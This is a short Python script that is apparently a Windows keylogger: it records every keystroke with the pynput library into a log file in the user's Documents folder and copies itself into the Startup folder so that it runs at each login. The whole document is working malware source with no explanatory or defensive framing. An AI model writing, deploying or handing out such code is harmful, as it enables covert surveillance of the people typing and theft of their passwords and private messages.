from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_dir = f"C:/Users/{username}/Documents/logger"

copyfile('keylogger.py', f'C:/Users/{username}/Appdata/Roaming/Microsoft/Start Menu/Startup/logger.py')

logging.basicConfig(filename=f"{logging_dir}/log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()

